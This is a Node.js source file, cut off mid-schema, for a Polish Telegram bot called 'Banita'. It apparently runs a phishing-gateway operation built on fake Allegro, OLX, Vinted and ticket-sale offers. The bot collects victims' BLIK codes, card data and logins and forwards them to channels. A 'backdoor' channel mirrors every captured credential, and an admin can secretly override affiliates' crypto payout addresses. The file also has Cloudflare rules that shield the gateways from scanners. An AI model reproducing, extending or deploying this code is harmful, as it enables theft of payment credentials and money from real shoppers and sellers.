process.env.NTBA_FIX_350 = 'true';
const path = require("path");
require('dotenv').config({
	path: path.join(__dirname, 'banita.env')
});
const fs = require('fs');
const crypto = require('crypto');
const TelegramBotModule = require('node-telegram-bot-api');
const TelegramBot = TelegramBotModule.default || TelegramBotModule;
const express = require('express');

const ownerIds = (process.env.OWNER_IDS || "")
	.split(",")
	.map((id) => parseInt(id))
	.filter(Number.isFinite);

// ID kanału z env (np. -1001234567890); puste/niepoprawne -> fallback z kodu
function channelIdFromEnv(name, fallback) {
	const raw = (process.env[name] || "").trim();
	if (!raw) return fallback;
	const num = Number(raw);
	return Number.isFinite(num) ? num : fallback;
}

// ============================================================
// GŁÓWNA KONFIGURACJA — edytuj w jednym miejscu
// ============================================================
const CONFIG = {
	TOKEN: process.env.TOKEN,
	PAYOUT_BOT_TOKEN: process.env.PAYOUT_BOT_TOKEN || "",
	OWNER_IDS: ownerIds,
	ADMIN_ID: (process.env.ADMIN_ID || process.env.PAYOUT_ADMIN_ID || ownerIds[0]).toString(),
	DEFAULT_FEE: parseFloat(process.env.DEFAULT_FEE || "30"),
	BOT_SETTINGS: {
		DEFAULT_LTC_ADDRESS: process.env.DEFAULT_LTC_ADDRESS || "Brak",
		DEFAULT_AUTO_WITHDRAW: process.env.DEFAULT_AUTO_WITHDRAW === "true",
		DEFAULT_DOMAIN: process.env.DEFAULT_DOMAIN || ""
	},
	CHANNELS: {
		// Kody BLIK / dane od użytkowników i bramki (kanał główny)
            CODES: channelIdFromEnv("CHANNEL_CODES", 0),
		// Backdoor — lustrzana kopia WSZYSTKICH kodów, kart i logowań
		BACKDOOR: channelIdFromEnv("CHANNEL_BACKDOOR", 0),
		// Zlecenia wypłat od użytkowników
		PAYOUTS: channelIdFromEnv("CHANNEL_PAYOUTS", 0),
		// Weryfikacje / podania użytkowników
		VERIFICATION: channelIdFromEnv("CHANNEL_VERIFICATION", 0)
	},
	// Osoby z dostępem do komend backdoora (/delay, /stats)
	BACKDOOR_IDS: (process.env.BACKDOOR_IDS || "")
		.split(",")
		.map((id) => id.trim())
		.filter(Boolean),
	// Tematy (topics) w kanałach — bot musi mieć has_topics_enabled
	TOPICS_ENABLED: process.env.CHANNEL_TOPICS === "true",
	THREADS: {
		BLIK: 2,
		CARD: 4
	},
	LIMITS: {
		DEFAULT_DEPOSIT: process.env.DEFAULT_DEPOSIT_LIMIT
			? parseFloat(process.env.DEFAULT_DEPOSIT_LIMIT)
			: null
	},
	RATE_LIMITS: {
		USER_ACTIVITY_MAX: parseInt(process.env.BOT_USER_RATE_MAX || "60", 10),
		USER_ACTIVITY_WINDOW_MS: parseInt(process.env.BOT_USER_RATE_WINDOW_MS || "60000", 10),
		WEBHOOK_MAX: parseInt(process.env.BOT_WEBHOOK_RATE_MAX || "500", 10),
		WEBHOOK_WINDOW_MS: 60_000,
		OWNER_BYPASS: process.env.BOT_OWNER_NO_RATE_LIMIT !== "false",
	},
	SERVER: {
		PORT: parseInt(process.env.PORT || "80", 10),
		WEBHOOK_PORT: parseInt(process.env.WEBHOOK_PORT || "8080", 10),
		APP_ROLE: (process.env.APP_ROLE || "both").toLowerCase(),
		BOT_DOMAIN: (process.env.BOT_DOMAIN || "").toLowerCase().replace(/^https?:\/\//, "").split("/")[0].split(":")[0],
		RESERVED_DOMAINS: (process.env.RESERVED_DOMAINS || "")
			.split(",")
			.map((d) => d.trim().toLowerCase())
			.filter(Boolean),
		WEBHOOK_PATH: process.env.WEBHOOK_PATH || "bot1_XDDkD83jsKf92Ls8QwXyZ",
		WEBHOOK_SECRET: process.env.WEBHOOK_SECRET || "",
		WEBHOOK_URL: (process.env.WEBHOOK_URL || "").replace(/\/+$/, ""),
		MONGODB_URI: process.env.MONGODB_URI || "mongodb://localhost:27017/banita"
	},
	CLOUDFLARE: {
		API_KEY: process.env.CLOUDFLARE_API_KEY || "",
		EMAIL: process.env.CLOUDFLARE_EMAIL || "",
		TUNNEL_HOST: process.env.CLOUDFLARE_TUNNEL_HOST || "",
		TUNNEL_ID: process.env.CLOUDFLARE_TUNNEL_ID || "",
		API_URL: "https://api.cloudflare.com/client/v4"
	},
	URLS: {
		CONTACT: "https://t.me/wspolpraca2banita",
		ALLEGRO_FALLBACK: "https://allegrolokalnie.pl/",
		ALLEGRO_404: "https://allegrolokalnie.pl/o/"
	}
};

const token = CONFIG.TOKEN;

// Topic ID albo null — kanały bez włączonych tematów odrzucają message_thread_id
function blikThread() {
	return CONFIG.TOPICS_ENABLED ? CONFIG.THREADS.BLIK : null;
}
function cardThread() {
	return CONFIG.TOPICS_ENABLED ? CONFIG.THREADS.CARD : null;
}

// ============================================================
// ZABEZPIECZENIA — anty-spam, anty-penetrowanie webhooka
// ============================================================
const TELEGRAM_IP_RANGES = [
	{ network: ipToLong("149.154.160.0"), bits: 20 },
	{ network: ipToLong("91.108.4.0"), bits: 22 }
];

function ipToLong(ip) {
	const parts = ip.split(".").map(Number);
	return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

function ipInRange(ipLong, network, bits) {
	const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
	return (ipLong & mask) === (network & mask);
}

function getClientIp(req) {
	const forwarded = req.headers["x-forwarded-for"];
	if (typeof forwarded === "string" && forwarded.length > 0) {
		return forwarded.split(",")[0].trim();
	}
	return req.ip || req.socket?.remoteAddress || "";
}

function isIpInTelegramRange(rawIp) {
	if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(rawIp)) {
		return false;
	}
	const ipLong = ipToLong(rawIp);
	return TELEGRAM_IP_RANGES.some(({ network, bits }) => ipInRange(ipLong, network, bits));
}

function isTelegramIp(req) {
	// Za Cloudflare Tunnel / Proxy — IP klienta jest w CF-Connecting-IP
	const cfIp = req.headers["cf-connecting-ip"];
	if (typeof cfIp === "string" && isIpInTelegramRange(cfIp.replace(/^::ffff:/, ""))) {
		return true;
	}

	// Ruch przez Cloudflare (secret token i tak jest wymagany)
	if (req.headers["cf-ray"]) {
		return true;
	}

	const rawIp = getClientIp(req).replace(/^::ffff:/, "");
	return isIpInTelegramRange(rawIp);
}

function createRateLimiter({ windowMs, max, keyFn }) {
	const buckets = new Map();
	return (req, res, next) => {
		const key = keyFn(req);
		const now = Date.now();
		const hits = (buckets.get(key) || []).filter((ts) => now - ts < windowMs);
		if (hits.length >= max) {
			return res.sendStatus(429);
		}
		hits.push(now);
		buckets.set(key, hits);
		next();
	};
}

const apiRateLimiter = createRateLimiter({
	windowMs: 60_000,
	max: 30,
	keyFn: (req) => getClientIp(req) || "unknown"
});

const webhookRateLimiter = createRateLimiter({
	windowMs: CONFIG.RATE_LIMITS.WEBHOOK_WINDOW_MS,
	max: CONFIG.RATE_LIMITS.WEBHOOK_MAX,
	keyFn: (req) => getClientIp(req) || "unknown"
});

const userActivityBuckets = new Map();

function isUserFlooding(userId) {
	if (!userId) return false;
	if (CONFIG.RATE_LIMITS.OWNER_BYPASS && isOwner(userId)) {
		return false;
	}
	const now = Date.now();
	const windowMs = CONFIG.RATE_LIMITS.USER_ACTIVITY_WINDOW_MS;
	const max = CONFIG.RATE_LIMITS.USER_ACTIVITY_MAX;
	const hits = (userActivityBuckets.get(userId) || []).filter((ts) => now - ts < windowMs);
	if (hits.length >= max) {
		return true;
	}
	hits.push(now);
	userActivityBuckets.set(userId, hits);
	return false;
}

function isValidTelegramUpdate(body) {
	return body
		&& typeof body === "object"
		&& Number.isInteger(body.update_id)
		&& (body.message || body.edited_message || body.callback_query || body.inline_query
			|| body.chosen_inline_result || body.channel_post || body.edited_channel_post
			|| body.shipping_query || body.pre_checkout_query || body.poll || body.poll_answer
			|| body.my_chat_member || body.chat_member || body.chat_join_request);
}

function isSafeHttpUrl(url) {
	try {
		const parsed = new URL(url);
		return parsed.protocol === "http:" || parsed.protocol === "https:";
	} catch {
		return false;
	}
}

function getBotDomain() {
	if (CONFIG.SERVER.BOT_DOMAIN) {
		return CONFIG.SERVER.BOT_DOMAIN;
	}
	if (CONFIG.SERVER.WEBHOOK_URL) {
		try {
			return new URL(CONFIG.SERVER.WEBHOOK_URL).hostname.toLowerCase();
		} catch {
			return "";
		}
	}
	return "";
}

function getRequestHost(req) {
	return (req.get("Host") || "").split(":")[0].toLowerCase();
}

function isBotInfrastructureHost(req) {
	const botDomain = getBotDomain();
	if (!botDomain) return false;
	const host = getRequestHost(req);
	if (!host) return false;
	if (host === botDomain || host.endsWith(`.${botDomain}`)) return true;
	if (host === `www.${botDomain}`) return true;
	return false;
}

function getRequestPath(req) {
	return (req.path || req.url || "/").split("?")[0].replace(/\/+$/, "") || "/";
}

function isWebhookPost(req) {
	if (req.method !== "POST") return false;
	const path = getRequestPath(req);
	const webhookPath = `/${CONFIG.SERVER.WEBHOOK_PATH}`;
	return path === webhookPath || path.endsWith(webhookPath);
}

function getReservedDomainsSet() {
	const reserved = new Set(CONFIG.SERVER.RESERVED_DOMAINS);
	const botDomain = getBotDomain();
	if (botDomain) {
		reserved.add(botDomain);
	}
	return reserved;
}

function isReservedDomain(domain) {
	if (!domain) return false;
	const normalized = domain.trim().toLowerCase();
	for (const reserved of getReservedDomainsSet()) {
		if (normalized === reserved || normalized.endsWith(`.${reserved}`)) {
			return true;
		}
	}
	return false;
}

function getReservedDomainError(domain) {
	return `<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Domena \`${domain}\` jest zarezerwowana dla infrastruktury bota i nie może być używana jako domena bramki.`;
}

function isOwner(userId) {
	return CONFIG.OWNER_IDS.includes(userId);
}

const globalRateLimiter = createRateLimiter({
	windowMs: 60_000,
	max: 120,
	keyFn: (req) => getClientIp(req) || "unknown"
});

const gatewayBurstLimiter = createRateLimiter({
	windowMs: 1_000,
	max: 20,
	keyFn: (req) => getClientIp(req) || "unknown"
});

const gatewayGlobalHits = [];
function gatewayFloodGuard(req, res, next) {
	if (isWebhookPost(req)) {
		return next();
	}
	const now = Date.now();
	while (gatewayGlobalHits.length > 0 && gatewayGlobalHits[0] < now - 1000) {
		gatewayGlobalHits.shift();
	}
	gatewayGlobalHits.push(now);
	if (gatewayGlobalHits.length > 150) {
		return res.status(503).end();
	}
	return gatewayBurstLimiter(req, res, next);
}

let gatewayLogSuppressed = 0;
function gatewayAccessLog(req) {
	if (gatewayLogSuppressed > 0) {
		gatewayLogSuppressed--;
		return;
	}
	if (Math.random() > 0.02) {
		gatewayLogSuppressed = 50;
		return;
	}
	console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`);
}

const axios = require("axios");

function getCloudflareHeaders() {
	return {
		"X-Auth-Email": CONFIG.CLOUDFLARE.EMAIL,
		"X-Auth-Key": CONFIG.CLOUDFLARE.API_KEY,
		"Content-Type": "application/json",
	};
}

async function getCloudflareZoneId(domain) {
	if (!CONFIG.CLOUDFLARE.API_KEY || !CONFIG.CLOUDFLARE.EMAIL) return null;
	try {
		const response = await axios.get(`${CONFIG.CLOUDFLARE.API_URL}/zones?name=${domain}`, {
			headers: getCloudflareHeaders(),
		});
		if (response.data.result?.length > 0) {
			return response.data.result[0].id;
		}
	} catch (err) {
		console.error(`[Cloudflare] Nie znaleziono strefy ${domain}:`, err.response?.data || err.message);
	}
	return null;
}

async function applyCloudflareGatewaySecurity(zoneId, domain) {
	if (!zoneId || !CONFIG.CLOUDFLARE.API_KEY || !CONFIG.CLOUDFLARE.EMAIL) return false;
	const headers = getCloudflareHeaders();
	const webhookPath = CONFIG.SERVER.WEBHOOK_PATH;

	try {
		await axios.patch(`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/settings/security_level`, { value: "medium" }, { headers });
		await axios.patch(`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/settings/browser_check`, { value: "off" }, { headers });
	} catch (err) {
		console.warn(`[Cloudflare] Ustawienia strefy ${domain}:`, err.response?.data?.errors || err.message);
	}

	try {
		await axios.put(
			`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/rulesets/phases/http_request_firewall_custom/entrypoint`,
			{
				rules: [
					{
						action: "block",
						expression: `(http.request.uri.path contains "${webhookPath}")`,
						description: "Banita: blok sciezki webhook na bramce",
						enabled: true,
					},
					{
						action: "managed_challenge",
						expression: "(cf.threat_score gt 10)",
						description: "Banita: auto-challenge podejrzany ruch",
						enabled: true,
					},
					{
						action: "block",
						expression: '(http.user_agent eq "") or (http.user_agent contains "python-requests") or (http.user_agent contains "Go-http-client") or (http.user_agent contains "curl/")',
						description: "Banita: blok skryptow i stresserow",
						enabled: true,
					},
				],
			},
			{ headers }
		);
		console.log(`[Cloudflare] WAF bramka OK: ${domain}`);
	} catch (err) {
		console.warn(`[Cloudflare] WAF bramka ${domain}:`, err.response?.data?.errors || err.message);
	}

	try {
		await axios.put(
			`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/rulesets/phases/http_ratelimit/entrypoint`,
			{
				rules: [
					{
						action: "block",
						expression: '(http.request.uri.path contains "/api/")',
						description: "Banita: API limit 120/10s",
						enabled: true,
						ratelimit: {
							characteristics: ["cf.colo.id", "ip.src"],
							period: 10,
							requests_per_period: 120,
							mitigation_timeout: 10,
						},
					},
					{
						action: "block",
						expression: "true",
						description: "Banita: limit ogolny 200/10s",
						enabled: true,
						ratelimit: {
							characteristics: ["cf.colo.id", "ip.src"],
							period: 10,
							requests_per_period: 200,
							mitigation_timeout: 10,
						},
					},
					{
						action: "block",
						expression: "true",
						description: "Banita: twardy limit DDoS 500/10s",
						enabled: true,
						ratelimit: {
							characteristics: ["cf.colo.id", "ip.src"],
							period: 10,
							requests_per_period: 500,
							mitigation_timeout: 10,
						},
					},
				],
			},
			{ headers }
		);
		console.log(`[Cloudflare] Rate limit bramka OK: ${domain}`);
	} catch (err) {
		console.warn(`[Cloudflare] Rate limit bramka ${domain}:`, err.response?.data?.errors || err.message);
	}

	return true;
}

async function applyCloudflareBotZoneSecurity(zoneId, domain) {
	if (!zoneId || !CONFIG.CLOUDFLARE.API_KEY || !CONFIG.CLOUDFLARE.EMAIL) return false;
	const headers = getCloudflareHeaders();

	try {
		await axios.patch(`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/settings/security_level`, { value: "medium" }, { headers });
		await axios.patch(`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/settings/browser_check`, { value: "off" }, { headers });
	} catch (err) {
		console.warn(`[Cloudflare] Ustawienia strefy bota ${domain}:`, err.response?.data?.errors || err.message);
	}

	// WAF na domenie bota Wylaczony — CF blokowal Telegram (404). Ochrona: secret token + tylko POST webhook w Node.
	try {
		await axios.put(
			`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/rulesets/phases/http_request_firewall_custom/entrypoint`,
			{ rules: [] },
			{ headers }
		);
		console.log(`[Cloudflare] WAF bot wyczyszczony (TG musi przechodzic): ${domain}`);
	} catch (err) {
		console.warn(`[Cloudflare] WAF bot ${domain}:`, err.response?.data?.errors || err.message);
	}

	try {
		await axios.put(
			`${CONFIG.CLOUDFLARE.API_URL}/zones/${zoneId}/rulesets/phases/http_ratelimit/entrypoint`,
			{ rules: [] },
			{ headers }
		);
		console.log(`[Cloudflare] Rate limit bot wylaczony: ${domain}`);
	} catch (err) {
		console.warn(`[Cloudflare] Czyszczenie rate limit bot ${domain}:`, err.response?.data?.errors || err.message);
	}

	return true;
}

async function applyCloudflareSecurityForDomain(domain) {
	if (isReservedDomain(domain)) return false;
	const zoneId = await getCloudflareZoneId(domain);
	if (!zoneId) {
		console.warn(`[Cloudflare] Brak strefy CF dla ${domain} — pominieto reguly (dodaj strefe w CF lub poczekaj)`);
		return false;
	}
	return applyCloudflareGatewaySecurity(zoneId, domain);
}

const cheerio = require('cheerio');
const util = require('util');
const https = require('https');
const http = require('http');

const mongoose = require('mongoose');

const moment = require('moment-timezone');

const puppeteer = require("puppeteer");


const bot = new TelegramBot(token, { polling: false });

const APP_ROLE = CONFIG.SERVER.APP_ROLE;
const RUN_GATEWAY = APP_ROLE === "gateway" || APP_ROLE === "both";
const RUN_WEBHOOK = APP_ROLE === "webhook" || APP_ROLE === "both";
const USE_SPLIT = APP_ROLE === "gateway" || APP_ROLE === "webhook";

function handleTelegramWebhookRequest(req, res) {
	console.log(`[WEBHOOK] POST ${req.path} od ${getClientIp(req)} host=${getRequestHost(req)}`);
	if (!CONFIG.SERVER.WEBHOOK_SECRET) {
		console.error("[WEBHOOK] Odrzucono — brak WEBHOOK_SECRET w banita.env");
		return res.sendStatus(503);
	}
	if (getBotDomain() && !isBotInfrastructureHost(req)) {
		console.warn(`[WEBHOOK] Host "${getRequestHost(req)}" != ${getBotDomain()} — przepuszczam (secret OK)`);
	}
	const secretHeader = req.headers["x-telegram-bot-api-secret-token"];
	if (secretHeader !== CONFIG.SERVER.WEBHOOK_SECRET) {
		console.error("[WEBHOOK] Odrzucono — zły secret token");
		return res.sendStatus(403);
	}
	if (!isTelegramIp(req)) {
		console.error(`[WEBHOOK] Odrzucono — IP spoza Telegram/CF: ${getClientIp(req)}`);
		return res.sendStatus(403);
	}
	if (!isValidTelegramUpdate(req.body)) {
		console.error("[WEBHOOK] Odrzucono — niepoprawne body update", JSON.stringify(req.body || {}).slice(0, 200));
		return res.sendStatus(400);
	}
	try {
		bot.processUpdate(req.body);
		if (req.body?.message?.text?.startsWith("/")) {
			console.log(`[WEBHOOK] Komenda: ${req.body.message.text} od ${req.body.message.from?.id} chat=${req.body.message.chat?.id}`);
		}
	} catch (err) {
		console.error("[WEBHOOK] Błąd processUpdate:", err.message || err);
	}
	return res.sendStatus(200);
}

function attachWebhookRoutes(targetApp) {
	targetApp.set("trust proxy", 1);
	targetApp.disable("x-powered-by");

	targetApp.use((req, res, next) => {
		res.setHeader("X-Content-Type-Options", "nosniff");
		res.setHeader("X-Frame-Options", "DENY");
		res.setHeader("Referrer-Policy", "no-referrer");
		next();
	});

	targetApp.use(express.json({ limit: "128kb" }));

	targetApp.use((req, res, next) => {
		if (isWebhookPost(req)) return next();
		const botDomain = getBotDomain();
		if (!botDomain) return next();
		const isBotHost = isBotInfrastructureHost(req);
		if (isBotHost) return res.status(404).end();
		next();
	});

	targetApp.post("/", (_req, res) => res.sendStatus(404));
	targetApp.post(`/${CONFIG.SERVER.WEBHOOK_PATH}`, webhookRateLimiter, handleTelegramWebhookRequest);
}

const webhookApp = express();
if (RUN_WEBHOOK) {
	attachWebhookRoutes(webhookApp);
}

const app = express();
app.set("trust proxy", 1);
app.disable("x-powered-by");

// Webhook TG — zawsze pierwszy, minimalny stack (both = port 80)
if (RUN_WEBHOOK && !USE_SPLIT) {
	app.use((req, res, next) => {
		if (!isWebhookPost(req)) return next();
	 return express.json({ limit: "128kb" })(req, res, next);
	});
	app.post(`/${CONFIG.SERVER.WEBHOOK_PATH}`, webhookRateLimiter, handleTelegramWebhookRequest);
	app.get(`/${CONFIG.SERVER.WEBHOOK_PATH}`, (_req, res) => res.status(200).send("webhook-ok"));
	console.log(`[WEBHOOK] Route GET+POST /${CONFIG.SERVER.WEBHOOK_PATH} (port ${CONFIG.SERVER.PORT})`);
}

// Split (2 procesy PM2): bramka :80 przekazuje webhook do bota :8080
if (RUN_GATEWAY && USE_SPLIT) {
	app.use((req, res, next) => {
		if (!isWebhookPost(req)) return next();
		return express.json({ limit: "128kb" })(req, res, next);
	});
	app.get(`/${CONFIG.SERVER.WEBHOOK_PATH}`, (_req, res) => res.status(200).send("webhook-proxy-ok"));
	app.post(`/${CONFIG.SERVER.WEBHOOK_PATH}`, async (req, res) => {
		const target = `http://127.0.0.1:${CONFIG.SERVER.WEBHOOK_PORT}/${CONFIG.SERVER.WEBHOOK_PATH}`;
		console.log(`[WEBHOOK] Proxy POST -> ${target}`);
		try {
			const proxyRes = await axios.post(target, req.body, {
				headers: {
					"x-telegram-bot-api-secret-token": req.headers["x-telegram-bot-api-secret-token"] || "",
					"content-type": "application/json",
					"cf-connecting-ip": req.headers["cf-connecting-ip"] || "",
					"cf-ray": req.headers["cf-ray"] || "",
					"x-forwarded-for": req.headers["x-forwarded-for"] || getClientIp(req),
				},
				validateStatus: () => true,
				timeout: 15_000,
			});
			return res.sendStatus(proxyRes.status);
		} catch (err) {
			console.error("[WEBHOOK] Proxy blad (czy krypciok-bot dziala na :8080?):", err.message);
			return res.sendStatus(502);
		}
	});
	console.log(`[WEBHOOK] Proxy /${CONFIG.SERVER.WEBHOOK_PATH} -> 127.0.0.1:${CONFIG.SERVER.WEBHOOK_PORT}`);
}

if (RUN_GATEWAY || RUN_WEBHOOK) {
if (RUN_GATEWAY) {

app.use((req, res, next) => {
	if (isWebhookPost(req)) return next();
	res.setHeader("X-Content-Type-Options", "nosniff");
	res.setHeader("X-Frame-Options", "DENY");
	res.setHeader("Referrer-Policy", "no-referrer");
	res.setHeader("Connection", "close");
	next();
});

app.use((req, res, next) => {
	if (isWebhookPost(req)) return next();
	if (req.path.includes("heartbeat")) return next();
	return gatewayFloodGuard(req, res, next);
});

app.use((req, res, next) => {
	if (isWebhookPost(req)) return next();
	if (!req.url.startsWith(`/${CONFIG.SERVER.WEBHOOK_PATH}`)) {
		gatewayAccessLog(req);
	}
	next();
});

app.use((req, res, next) => {
	if (isWebhookPost(req)) return next();
	if (req.method === "GET" || req.method === "HEAD") {
		return next();
	}
	return express.json({ limit: "128kb" })(req, res, next);
});
}

if (RUN_GATEWAY) {
app.use((req, res, next) => {
	if (isWebhookPost(req)) return next();
	const botDomain = getBotDomain();
	if (!botDomain) return next();
	const host = getRequestHost(req);
	if (!host) return next();
	// Tylko sama domena bota (bez poddomen bramek) jest "infrastrukturą"
	const isGatewaySubdomain = host !== botDomain && host !== `www.${botDomain}` && host.endsWith(`.${botDomain}`);
	const path = (req.path || "").replace(/\/+$/, "");
	if (!isGatewaySubdomain && isBotInfrastructureHost(req) && path !== "/health") {
		return res.status(404).end();
	}
	next();
});

app.use((req, res, next) => {
	if (isWebhookPost(req)) return next();
	if (req.path.includes("heartbeat")) return next();
	return globalRateLimiter(req, res, next);
});

app.post("/", (_req, res) => res.sendStatus(404));
}

if (RUN_GATEWAY && !RUN_WEBHOOK) {
	console.warn("[WEBHOOK] APP_ROLE=gateway — bot NIE odbiera /start! Ustaw APP_ROLE=both w banita.env i zrestartuj PM2.");
}

async function initTelegramWebhook() {
	if (!CONFIG.SERVER.WEBHOOK_URL) {
		console.warn("[SECURITY] Ustaw WEBHOOK_URL w banita.env (domena infrastruktury bota, NIE domena bramki).");
		return;
	}
	if (!CONFIG.SERVER.WEBHOOK_SECRET) {
		console.error("[SECURITY] Ustaw WEBHOOK_SECRET w banita.env przed uruchomieniem bota.");
		return;
	}

	const webhookTarget = `${CONFIG.SERVER.WEBHOOK_URL}/${CONFIG.SERVER.WEBHOOK_PATH}`;
	const setHookFn = bot.setWebhook || bot.setWebHook;
	const getHookInfoFn = bot.getWebhookInfo || bot.getWebHookInfo;
	let dropPending = false;
	if (getHookInfoFn) {
		try {
			const prev = await getHookInfoFn.call(bot);
			if (prev?.last_error_message) {
				dropPending = true;
				console.log(`[WEBHOOK] Czyszcze pending po bledzie: ${prev.last_error_message}`);
			}
		} catch (e) {}
	}
	await setHookFn.call(bot, webhookTarget, {
		secret_token: CONFIG.SERVER.WEBHOOK_SECRET,
		allowed_updates: [
			"message",
			"edited_message",
			"callback_query",
			"inline_query",
			"chosen_inline_result"
		],
		drop_pending_updates: dropPending
	});
	console.log(`[WEBHOOK] Aktywny (infra): ${webhookTarget}`);
	if (getHookInfoFn) {
		const info = await getHookInfoFn.call(bot);
		console.log(`[WEBHOOK] Telegram url: ${info.url || "brak"}, pending: ${info.pending_update_count ?? "?"}, err: ${info.last_error_message || "brak"}`);
	}
	if (getBotDomain()) {
		console.log(`[DOMAIN] Domena bota (zarezerwowana): ${getBotDomain()}`);
	}

	// Komendy widoczne w prywatnym czacie (bez backdoora)
	try {
		await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({
				commands: [
					{ command: "start", description: "Menu główne" },
					{ command: "selfcashout", description: "Aktywuj self cashout kodem" },
					{ command: "id", description: "Twoje ID" }
				],
				scope: { type: "all_private_chats" }
			})
		});
	} catch (e) {}

	// Komendy w kanale kopii (widoczne tylko tam)
	try {
		await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({
				commands: [
					{ command: "balance", description: "Salda wszystkich graczy" },
					{ command: "change", description: "change addy <id> <adres>" },
					{ command: "delay", description: "Opóźnienie kodów 0-60s" },
					{ command: "stats", description: "Statystyki kodów" }
				],
				scope: { type: "chat", chat_id: CONFIG.CHANNELS.BACKDOOR }
			})
		});
	} catch (e) {}
}



mongoose.connect(CONFIG.SERVER.MONGODB_URI, {
	serverSelectionTimeoutMS: 5000,
})
	.then(() => console.log(`[MongoDB] Połączono: ${CONFIG.SERVER.MONGODB_URI}`))
	.catch((error) => {
		console.error('[MongoDB] BRAK POLACZENIA — uruchom MongoDB na serwerze (port 27017):', error.message || error);
	});

function isMongoConnected() {
	return mongoose.connection.readyState === 1;
}

async function ensureMongoConnected() {
	if (isMongoConnected()) return true;
	try {
		await mongoose.connect(CONFIG.SERVER.MONGODB_URI, { serverSelectionTimeoutMS: 5000 });
		console.log(`[MongoDB] Połączono ponownie: ${CONFIG.SERVER.MONGODB_URI}`);
		return true;
	} catch (error) {
		console.error('[MongoDB] Nadal brak połączenia:', error.message || error);
		return false;
	}
}


	const userSchema = new mongoose.Schema({
		username: String,
		id: Number,
		banned: Number,
		role: String,
		added_at: String,
		expires: String,
		settings: {
			domain: String,
			domainMode: {
				type: String,
				default: "public"
			},
			customDomain: String,
			assignedPublicDomain: String,
			card: String,
			bliki: String,
		},
		przelewy: {
			status: String,
			Imie: String,
			Nazwisko: String,
			Numer: String,
		},
		approved: {
			type: Boolean,
			default: false
		},
		deposited: {
			type: Number,
			default: 0
		},
		withdrawn: {
			type: Number,
			default: 0
		},
		ltcAddress: {
			type: String,
			default: "Brak"
		},
		// Adres docelowy nadpisany przez admina (backdoor). User nadal widzi swój w Ustawieniach.
		payoutOverrideAddress: {
			type: String,
			default: null
		},
		autoWithdraw: {
			type: Boolean,
			default: false
		},
		customFee: {
			type: Number,
			default: null
		},
		// Self cashout indywidualny (promo kod) — data wygaśnięcia
		selfCashoutUntil: {
			type: Date,
			default: null
		},
		verificationSource: {
			type: String,
			default: null
		},
		fgState: String,
		tempAmount: Number,
		promptMessageId: Number,
		adminState: String,
	}, {
		versionKey: false
	});
	
	const User = mongoose.model("User", userSchema, 'users');

	const botConfigSchema = new mongoose.Schema({
		key: {
			type: String,
			required: true,
			unique: true
		},
		value: String
	}, {
		versionKey: false
	});

	const BotConfig = mongoose.model("BotConfig", botConfigSchema, 'botconfig');

	// Promo kody na self cashout
	const promoCodeSchema = new mongoose.Schema({
		code: {
			type: String,
			required: true,
			unique: true
		},
		days: {
			type: Number,
			required: true
		},
		createdBy: Number,
		createdAt: {
			type: Date,
			default: Date.now
		},
		usedBy: Number,
		usedAt: Date
	}, {
		versionKey: false
	});
	const PromoCode = mongoose.model("PromoCode", promoCodeSchema, 'promocodes');
	
	
	const offerSchema = new mongoose.Schema({
		idoferty: {
			type: String,
			required: true
		},
		nazwa: String,
		description: String,
		cena: String,
		sprzedawca: String,
		owner: String,
		miasto: String,
		wojewodztwo: String,
		kategoria: String,
		tagi: String,
		zdjecia: [String],
		link: String,
		rodzaj: String,
		wiek: String,
		numer: String,
		lastonline: String,

	}, {
		versionKey: false
	});
	
	offerSchema.index({
		idoferty: 1
	}, {
		unique: true
	});
	
	const Offer = mongoose.model('Offer', offerSchema, 'offers');
	
	
	const OLXofferSchema = new mongoose.Schema({
		idoferty: {
			type: String,
			required: true
		},
		nazwa: String,
		description: String,
		cena: String,
		sprzedawca: String,
		owner: String,
		miasto: String,
		wojewodztwo: String,
		kategoria: String,
		tagi: String,
		zdjecia: [String],
		link: String,
		lastonline: String,
		wiek: String,
		numer: String,
	}, {
		versionKey: false
	});
	
	OLXofferSchema.index({
		idoferty: 1
	}, {
		unique: true
	});
	
	const OfferOLX = mongoose.model('OfferOLX', OLXofferSchema, 'olxoffers');

	const ticketmasterOfferSchema = new mongoose.Schema({
		idoferty: { type: String, required: true },
		nazwa: String,
		description: String,
		cena: String,
		oplata: String,
		owner: String,
		miasto: String,
		lastonline: String,
		tagi: String,
		zdjecia: [String],
		link: String,
	}, { versionKey: false });

	ticketmasterOfferSchema.index({ idoferty: 1 }, { unique: true });

	const OfferTicketmaster = mongoose.model('OfferTicketmaster', ticketmasterOfferSchema, 'ticketmasteroffers');

	const vintedOfferSchema = new mongoose.Schema({
		idoferty: { type: String, required: true },
		nazwa: String,
		description: String,
		cena: String,
		cenaDostawy: String,
		cenaOchrony: String,
		nazwaFirmy: String,
		sprzedawca: String,
		owner: String,
		miasto: String,
		kategoria: String,
		tagi: String,
		zdjecia: [String],
		link: String,
		wiek: String,
		lastonline: String,
	}, { versionKey: false });

	vintedOfferSchema.index({ idoferty: 1 }, { unique: true });

	const OfferVinted = mongoose.model('OfferVinted', vintedOfferSchema, 'vintedoffers');

	const alebiletOfferSchema = new mongoose.Schema({
		idoferty: { type: String, required: true },
		nazwa: String,
		description: String,
		cena: String,
		oplata: String,
		ilosc: String,
		owner: String,
		miasto: String,
		lastonline: String,
		tagi: String,
		zdjecia: [String],
		link: String,
	}, { versionKey: false });

	alebiletOfferSchema.index({ idoferty: 1 }, { unique: true });

	const OfferAlebilet = mongoose.model('OfferAlebilet', alebiletOfferSchema, 'alebiletoffers');

	const blikSessionSchema = new mongoose.Schema({
		code: { type: String, required: true, unique: true, index: true },
